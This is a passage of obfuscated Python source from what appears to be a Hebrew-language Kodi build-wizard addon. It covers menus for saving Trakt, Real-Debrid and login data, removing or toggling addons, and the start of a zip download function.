	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0O0OO000OOOO0O0 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3149
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0OO00000OO0OO000 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3155
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O000OOOO00O0OOOOO .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO00O000O00O00OOO .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OOOOO000O00OOO00O .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3160
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O00000OO0OO0O0OOO .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3161
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0O000O000OOO0000 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת פליליסט לאודר:  '%O0O00O0O00OOO0O0O .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3164
	addFile ('%s שמירת הגדרות באפר: '%O00O00OOO0OO0O0O0 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3169
	addFile ('%s שמירת רשימות ריפו:  '%OO00000OOOO00O00O .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3171
	setView ('files','viewType')#line:3173
def traktMenu ():#line:3175
	OO0O00OO0000O0000 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3176
	O000O000O0OOO0000 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3177
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	addFile ('Save Trakt Data: %s'%OO0O00OO0000O0000 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3179
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O000O000O0OOO0000 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3180
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	for OO0O00OO0000O0000 in traktit .ORDER :#line:3183
		O00O00O0OO0000O00 =TRAKTID [OO0O00OO0000O0000 ]['name']#line:3184
		O0O0OOOOO00OOOOOO =TRAKTID [OO0O00OO0000O0000 ]['path']#line:3185
		OOO0OOOO000OOOO0O =TRAKTID [OO0O00OO0000O0000 ]['saved']#line:3186
		O000000OO00OO0O0O =TRAKTID [OO0O00OO0000O0000 ]['file']#line:3187
		O000OOOOOO000O0O0 =wiz .getS (OOO0OOOO000OOOO0O )#line:3188
		OOOOOOO00O00O0OOO =traktit .traktUser (OO0O00OO0000O0000 )#line:3189
		OO00O0O0OO0O0OOOO =TRAKTID [OO0O00OO0000O0000 ]['icon']if os .path .exists (O0O0OOOOO00OOOOOO )else ICONTRAKT #line:3190
		OO0O00OOOO0OOO0O0 =TRAKTID [OO0O00OO0000O0000 ]['fanart']if os .path .exists (O0O0OOOOO00OOOOOO )else FANART #line:3191
		OO00OOO0000OO0000 =createMenu ('saveaddon','Trakt',OO0O00OO0000O0000 )#line:3192
		O0OO000O0OOOO00OO =createMenu ('save','Trakt',OO0O00OO0000O0000 )#line:3193
		OO00OOO0000OO0000 .append ((THEME2 %'%s Settings'%O00O00O0OO0000O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0O00OO0000O0000 )))#line:3194
		addFile ('[+]-> %s'%O00O00O0OO0000O00 ,'',icon =OO00O0O0OO0O0OOOO ,fanart =OO0O00OOOO0OOO0O0 ,themeit =THEME3 )#line:3196
		if not os .path .exists (O0O0OOOOO00OOOOOO ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO00O0O0OO0O0OOOO ,fanart =OO0O00OOOO0OOO0O0 ,menu =OO00OOO0000OO0000 )#line:3197
		elif not OOOOOOO00O00O0OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0O00OO0000O0000 ,icon =OO00O0O0OO0O0OOOO ,fanart =OO0O00OOOO0OOO0O0 ,menu =OO00OOO0000OO0000 )#line:3198
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOOOO00O00O0OOO ,'authtrakt',OO0O00OO0000O0000 ,icon =OO00O0O0OO0O0OOOO ,fanart =OO0O00OOOO0OOO0O0 ,menu =OO00OOO0000OO0000 )#line:3199
		if O000OOOOOO000O0O0 =="":#line:3200
			if os .path .exists (O000000OO00OO0O0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0O00OO0000O0000 ,icon =OO00O0O0OO0O0OOOO ,fanart =OO0O00OOOO0OOO0O0 ,menu =O0OO000O0OOOO00OO )#line:3201
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0O00OO0000O0000 ,icon =OO00O0O0OO0O0OOOO ,fanart =OO0O00OOOO0OOO0O0 ,menu =O0OO000O0OOOO00OO )#line:3202
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O000OOOOOO000O0O0 ,'',icon =OO00O0O0OO0O0OOOO ,fanart =OO0O00OOOO0OOO0O0 ,menu =O0OO000O0OOOO00OO )#line:3203
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3205
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3206
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3207
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3208
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3209
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	setView ('files','viewType')#line:3211
def realMenu ():#line:3213
	O0OOO0O0OO00OOOOO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3214
	OO00O0O0OO0OO0O00 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3215
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3216
	addFile ('Save Real Debrid Data: %s'%O0OOO0O0OO00OOOOO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3217
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO00O0O0OO0OO0O00 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3218
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3219
	for OOO00O00O0O0OOO00 in debridit .ORDER :#line:3221
		OOOO0O00OOOO0OO00 =DEBRIDID [OOO00O00O0O0OOO00 ]['name']#line:3222
		OO00O00O0O00O0O00 =DEBRIDID [OOO00O00O0O0OOO00 ]['path']#line:3223
		OOO0O0OOOOOO0OO00 =DEBRIDID [OOO00O00O0O0OOO00 ]['saved']#line:3224
		OOO0O00OOOO0OOO00 =DEBRIDID [OOO00O00O0O0OOO00 ]['file']#line:3225
		O00OOO0O0O000O00O =wiz .getS (OOO0O0OOOOOO0OO00 )#line:3226
		OO0OO0O000O000O0O =debridit .debridUser (OOO00O00O0O0OOO00 )#line:3227
		O0O0000000OOOO000 =DEBRIDID [OOO00O00O0O0OOO00 ]['icon']if os .path .exists (OO00O00O0O00O0O00 )else ICONREAL #line:3228
		O00OO00OOOO0O00OO =DEBRIDID [OOO00O00O0O0OOO00 ]['fanart']if os .path .exists (OO00O00O0O00O0O00 )else FANART #line:3229
		OOOOOOOO0O0OOOO0O =createMenu ('saveaddon','Debrid',OOO00O00O0O0OOO00 )#line:3230
		O00O0OOOOOOOO000O =createMenu ('save','Debrid',OOO00O00O0O0OOO00 )#line:3231
		OOOOOOOO0O0OOOO0O .append ((THEME2 %'%s Settings'%OOOO0O00OOOO0OO00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO00O00O0O0OOO00 )))#line:3232
		addFile ('[+]-> %s'%OOOO0O00OOOO0OO00 ,'',icon =O0O0000000OOOO000 ,fanart =O00OO00OOOO0O00OO ,themeit =THEME3 )#line:3234
		if not os .path .exists (OO00O00O0O00O0O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O0000000OOOO000 ,fanart =O00OO00OOOO0O00OO ,menu =OOOOOOOO0O0OOOO0O )#line:3235
		elif not OO0OO0O000O000O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO00O00O0O0OOO00 ,icon =O0O0000000OOOO000 ,fanart =O00OO00OOOO0O00OO ,menu =OOOOOOOO0O0OOOO0O )#line:3236
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OO0O000O000O0O ,'authdebrid',OOO00O00O0O0OOO00 ,icon =O0O0000000OOOO000 ,fanart =O00OO00OOOO0O00OO ,menu =OOOOOOOO0O0OOOO0O )#line:3237
		if O00OOO0O0O000O00O =="":#line:3238
			if os .path .exists (OOO0O00OOOO0OOO00 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO00O00O0O0OOO00 ,icon =O0O0000000OOOO000 ,fanart =O00OO00OOOO0O00OO ,menu =O00O0OOOOOOOO000O )#line:3239
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO00O00O0O0OOO00 ,icon =O0O0000000OOOO000 ,fanart =O00OO00OOOO0O00OO ,menu =O00O0OOOOOOOO000O )#line:3240
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00OOO0O0O000O00O ,'',icon =O0O0000000OOOO000 ,fanart =O00OO00OOOO0O00OO ,menu =O00O0OOOOOOOO000O )#line:3241
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3243
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3244
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3245
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3246
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3247
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	setView ('files','viewType')#line:3249
def loginMenu ():#line:3251
	O000000OO00000OO0 ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3252
	O00O000OO00000000 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3253
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	addFile ('Save Login Data: %s'%O000000OO00000OO0 ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3255
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O00O000OO00000000 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3256
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	for O000000OO00000OO0 in loginit .ORDER :#line:3259
		OOO000OOOOO00OO0O =LOGINID [O000000OO00000OO0 ]['name']#line:3260
		O0O0000O0OOO0O00O =LOGINID [O000000OO00000OO0 ]['path']#line:3261
		O00000O0O0000OO00 =LOGINID [O000000OO00000OO0 ]['saved']#line:3262
		O0O0OO0000OO0OO0O =LOGINID [O000000OO00000OO0 ]['file']#line:3263
		O00O000OO00O00OOO =wiz .getS (O00000O0O0000OO00 )#line:3264
		OOOO0000O0OO00OO0 =loginit .loginUser (O000000OO00000OO0 )#line:3265
		O00O0OOOOO0OOOO0O =LOGINID [O000000OO00000OO0 ]['icon']if os .path .exists (O0O0000O0OOO0O00O )else ICONLOGIN #line:3266
		O0O0000O0OOOO0O00 =LOGINID [O000000OO00000OO0 ]['fanart']if os .path .exists (O0O0000O0OOO0O00O )else FANART #line:3267
		O00O0OOOO0000O0O0 =createMenu ('saveaddon','Login',O000000OO00000OO0 )#line:3268
		O0OO0O00OO00OOO00 =createMenu ('save','Login',O000000OO00000OO0 )#line:3269
		O00O0OOOO0000O0O0 .append ((THEME2 %'%s Settings'%OOO000OOOOO00OO0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O000000OO00000OO0 )))#line:3270
		addFile ('[+]-> %s'%OOO000OOOOO00OO0O ,'',icon =O00O0OOOOO0OOOO0O ,fanart =O0O0000O0OOOO0O00 ,themeit =THEME3 )#line:3272
		if not os .path .exists (O0O0000O0OOO0O00O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00O0OOOOO0OOOO0O ,fanart =O0O0000O0OOOO0O00 ,menu =O00O0OOOO0000O0O0 )#line:3273
		elif not OOOO0000O0OO00OO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O000000OO00000OO0 ,icon =O00O0OOOOO0OOOO0O ,fanart =O0O0000O0OOOO0O00 ,menu =O00O0OOOO0000O0O0 )#line:3274
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOO0000O0OO00OO0 ,'authlogin',O000000OO00000OO0 ,icon =O00O0OOOOO0OOOO0O ,fanart =O0O0000O0OOOO0O00 ,menu =O00O0OOOO0000O0O0 )#line:3275
		if O00O000OO00O00OOO =="":#line:3276
			if os .path .exists (O0O0OO0000OO0OO0O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O000000OO00000OO0 ,icon =O00O0OOOOO0OOOO0O ,fanart =O0O0000O0OOOO0O00 ,menu =O0OO0O00OO00OOO00 )#line:3277
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O000000OO00000OO0 ,icon =O00O0OOOOO0OOOO0O ,fanart =O0O0000O0OOOO0O00 ,menu =O0OO0O00OO00OOO00 )#line:3278
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O000OO00O00OOO ,'',icon =O00O0OOOOO0OOOO0O ,fanart =O0O0000O0OOOO0O00 ,menu =O0OO0O00OO00OOO00 )#line:3279
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3281
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3282
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3283
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3284
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3285
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	setView ('files','viewType')#line:3287
def fixUpdate ():#line:3289
	if KODIV <17 :#line:3290
		OO00O00O0OOO000OO =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3291
		try :#line:3292
			os .remove (OO00O00O0OOO000OO )#line:3293
		except Exception as O0OOOOO0000O00O00 :#line:3294
			wiz .log ("Unable to remove %s, Purging DB"%OO00O00O0OOO000OO )#line:3295
			wiz .purgeDb (OO00O00O0OOO000OO )#line:3296
	else :#line:3297
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3298
def removeAddonMenu ():#line:3300
	O0OO0OOO0OO000O00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3301
	OO0OOOOOO0OO00OOO =[];O00O0O00OO0O0OO0O =[]#line:3302
	for O0O00OO0O00OO000O in sorted (O0OO0OOO0OO000O00 ,key =lambda O00OO0O0O0O0O0OOO :O00OO0O0O0O0O0OOO ):#line:3303
		OO0OO0OO000OO00OO =os .path .split (O0O00OO0O00OO000O [:-1 ])[1 ]#line:3304
		if OO0OO0OO000OO00OO in EXCLUDES :continue #line:3305
		elif OO0OO0OO000OO00OO in DEFAULTPLUGINS :continue #line:3306
		elif OO0OO0OO000OO00OO =='packages':continue #line:3307
		O0O0O00O00OO0000O =os .path .join (O0O00OO0O00OO000O ,'addon.xml')#line:3308
		if os .path .exists (O0O0O00O00OO0000O ):#line:3309
			OOOO0O00O00OO0O0O =open (O0O0O00O00OO0000O )#line:3310
			O00000O0O0OOOO00O =OOOO0O00O00OO0O0O .read ()#line:3311
			OO0OOOOOO0OOOOOOO =wiz .parseDOM (O00000O0O0OOOO00O ,'addon',ret ='id')#line:3312
			O00OO0O0O0O00000O =OO0OO0OO000OO00OO if len (OO0OOOOOO0OOOOOOO )==0 else OO0OOOOOO0OOOOOOO [0 ]#line:3314
			try :#line:3315
				O0OO000OOO00O00OO =xbmcaddon .Addon (id =O00OO0O0O0O00000O )#line:3316
				OO0OOOOOO0OO00OOO .append (O0OO000OOO00O00OO .getAddonInfo ('name'))#line:3317
				O00O0O00OO0O0OO0O .append (O00OO0O0O0O00000O )#line:3318
			except :#line:3319
				pass #line:3320
	if len (OO0OOOOOO0OO00OOO )==0 :#line:3321
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3322
		return #line:3323
	if KODIV >16 :#line:3324
		O0O0O0OO0000OOO0O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0OOOOOO0OO00OOO )#line:3325
	else :#line:3326
		O0O0O0OO0000OOO0O =[];O0OOO000O00O00OOO =0 #line:3327
		OOOOO0OO000O0O000 =["-- Click here to Continue --"]+OO0OOOOOO0OO00OOO #line:3328
		while not O0OOO000O00O00OOO ==-1 :#line:3329
			O0OOO000O00O00OOO =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOOOO0OO000O0O000 )#line:3330
			if O0OOO000O00O00OOO ==-1 :break #line:3331
			elif O0OOO000O00O00OOO ==0 :break #line:3332
			else :#line:3333
				OO000O000OO0O000O =(O0OOO000O00O00OOO -1 )#line:3334
				if OO000O000OO0O000O in O0O0O0OO0000OOO0O :#line:3335
					O0O0O0OO0000OOO0O .remove (OO000O000OO0O000O )#line:3336
					OOOOO0OO000O0O000 [O0OOO000O00O00OOO ]=OO0OOOOOO0OO00OOO [OO000O000OO0O000O ]#line:3337
				else :#line:3338
					O0O0O0OO0000OOO0O .append (OO000O000OO0O000O )#line:3339
					OOOOO0OO000O0O000 [O0OOO000O00O00OOO ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0OOOOOO0OO00OOO [OO000O000OO0O000O ])#line:3340
	if O0O0O0OO0000OOO0O ==None :return #line:3341
	if len (O0O0O0OO0000OOO0O )>0 :#line:3342
		wiz .addonUpdates ('set')#line:3343
		for O000000O000O0OO0O in O0O0O0OO0000OOO0O :#line:3344
			removeAddon (O00O0O00OO0O0OO0O [O000000O000O0OO0O ],OO0OOOOOO0OO00OOO [O000000O000O0OO0O ],True )#line:3345
		xbmc .sleep (1000 )#line:3347
		if INSTALLMETHOD ==1 :O0O000000OOO0O000 =1 #line:3349
		elif INSTALLMETHOD ==2 :O0O000000OOO0O000 =0 #line:3350
		else :O0O000000OOO0O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3351
		if O0O000000OOO0O000 ==1 :wiz .reloadFix ('remove addon')#line:3352
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3353
def removeAddonDataMenu ():#line:3355
	if os .path .exists (ADDOND ):#line:3356
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3357
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3358
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3359
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3360
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3361
		OO0OO0O000000O00O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3362
		for OOO0OO0OOO000OO00 in sorted (OO0OO0O000000O00O ,key =lambda O0OO0O0OOO0000O00 :O0OO0O0OOO0000O00 ):#line:3363
			OOOOO0O00OO0O0OOO =OOO0OO0OOO000OO00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3364
			OO00000000OO000O0 =os .path .join (OOO0OO0OOO000OO00 .replace (ADDOND ,ADDONS ),'icon.png')#line:3365
			OO00000O00O0O00OO =os .path .join (OOO0OO0OOO000OO00 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3366
			O00000O0OO0OO00OO =OOOOO0O00OO0O0OOO #line:3367
			O00O0OO0O0OOO0000 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3368
			for OOO0OOO0OO0000OO0 in O00O0OO0O0OOO0000 :#line:3369
				O00000O0OO0OO00OO =O00000O0OO0OO00OO .replace (OOO0OOO0OO0000OO0 ,O00O0OO0O0OOO0000 [OOO0OOO0OO0000OO0 ])#line:3370
			if OOOOO0O00OO0O0OOO in EXCLUDES :O00000O0OO0OO00OO ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O00000O0OO0OO00OO #line:3371
			else :O00000O0OO0OO00OO ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O00000O0OO0OO00OO #line:3372
			addFile (' %s'%O00000O0OO0OO00OO ,'removedata',OOOOO0O00OO0O0OOO ,icon =OO00000000OO000O0 ,fanart =OO00000O00O0O00OO ,themeit =THEME2 )#line:3373
	else :#line:3374
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3375
	setView ('files','viewType')#line:3376
def enableAddons ():#line:3378
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3379
	OO0O0O0OOO0000OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3380
	O0O0OO00OO0O00OOO =0 #line:3381
	for O0OO0O00O0O000OOO in sorted (OO0O0O0OOO0000OOO ,key =lambda O0OO00O0000O0OO00 :O0OO00O0000O0OO00 ):#line:3382
		O00OO0O000O0O0OO0 =os .path .split (O0OO0O00O0O000OOO [:-1 ])[1 ]#line:3383
		if O00OO0O000O0O0OO0 in EXCLUDES :continue #line:3384
		if O00OO0O000O0O0OO0 in DEFAULTPLUGINS :continue #line:3385
		OO000OO00OO00O0O0 =os .path .join (O0OO0O00O0O000OOO ,'addon.xml')#line:3386
		if os .path .exists (OO000OO00OO00O0O0 ):#line:3387
			O0O0OO00OO0O00OOO +=1 #line:3388
			OO0O0O0OOO0000OOO =O0OO0O00O0O000OOO .replace (ADDONS ,'')[1 :-1 ]#line:3389
			OOO00OO000OOOO0O0 =open (OO000OO00OO00O0O0 )#line:3390
			OO00000O0O0000OOO =OOO00OO000OOOO0O0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3391
			OOOOO0O0OO0OO0OO0 =wiz .parseDOM (OO00000O0O0000OOO ,'addon',ret ='id')#line:3392
			OOOOOOOOO00OO000O =wiz .parseDOM (OO00000O0O0000OOO ,'addon',ret ='name')#line:3393
			try :#line:3394
				O0OOO00O000OO00OO =OOOOO0O0OO0OO0OO0 [0 ]#line:3395
				O00OO00O0O0OOOO0O =OOOOOOOOO00OO000O [0 ]#line:3396
			except :#line:3397
				continue #line:3398
			try :#line:3399
				OO0OOO000O0000000 =xbmcaddon .Addon (id =O0OOO00O000OO00OO )#line:3400
				OO0OOOO000OO0OO0O ="[COLOR green][Enabled][/COLOR]"#line:3401
				O00O00O0OO00OO000 ="false"#line:3402
			except :#line:3403
				OO0OOOO000OO0OO0O ="[COLOR red][Disabled][/COLOR]"#line:3404
				O00O00O0OO00OO000 ="true"#line:3405
				pass #line:3406
			O000OOOOO0OO0OO0O =os .path .join (O0OO0O00O0O000OOO ,'icon.png')if os .path .exists (os .path .join (O0OO0O00O0O000OOO ,'icon.png'))else ICON #line:3407
			OOOO0OO0OO0OO00O0 =os .path .join (O0OO0O00O0O000OOO ,'fanart.jpg')if os .path .exists (os .path .join (O0OO0O00O0O000OOO ,'fanart.jpg'))else FANART #line:3408
			addFile ("%s %s"%(OO0OOOO000OO0OO0O ,O00OO00O0O0OOOO0O ),'toggleaddon',OO0O0O0OOO0000OOO ,O00O00O0OO00OO000 ,icon =O000OOOOO0OO0OO0O ,fanart =OOOO0OO0OO0OO00O0 )#line:3409
			OOO00OO000OOOO0O0 .close ()#line:3410
	if O0O0OO00OO0O00OOO ==0 :#line:3411
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3412
	setView ('files','viewType')#line:3413
def changeFeq ():#line:3415
	O000OOOOO000OO0O0 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3416
	OOOOO0OO0OO0OO0OO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O000OOOOO000OO0O0 )#line:3417
	if not OOOOO0OO0OO0OO0OO ==-1 :#line:3418
		wiz .setS ('autocleanfeq',str (OOOOO0OO0OO0OO0OO ))#line:3419
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O000OOOOO000OO0O0 [OOOOO0OO0OO0OO0OO ]))#line:3420
def developer ():#line:3422
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3423
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3424
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3425
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3426
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3427
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3428
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3429
	setView ('files','viewType')#line:3431
def download (OOO00O0O0O00O0000 ,O0O00OOO0000000O0 ):#line:3436
  OO0000O0O0O00O000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3437
  OO00OO00OOOOO00OO =xbmcgui .DialogProgress ()#line:3438
  OO00OO00OOOOO00OO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3439
  OO00OOOO00O00O000 =os .path .join (OO0000O0O0O00O000 ,'isr.zip')#line:3440
  OOO00O000O0OO0OOO =urllib2 .Request (OOO00O0O0O00O0000 )#line:3441
  O0OO0O000OO0000OO =urllib2 .urlopen (OOO00O000O0OO0OOO )#line:3442
  O0OO0O0OOO00000O0 =xbmcgui .DialogProgress ()#line:3444
  O0OO0O0OOO00000O0 .create ("Downloading","Downloading "+name )#line:3445
  O0OO0O0OOO00000O0 .update (0 )#line:3446
  O000O0O0OOO000O00 =O0O00OOO0000000O0 #line:3447
  OOOOOOOOOO0O0OOOO =open (OO00OOOO00O00O000 ,'wb')#line:3448
  try :#line:3450
    O000000000O0O0O0O =O0OO0O000OO0000OO .info ().getheader ('Content-Length').strip ()#line:3451
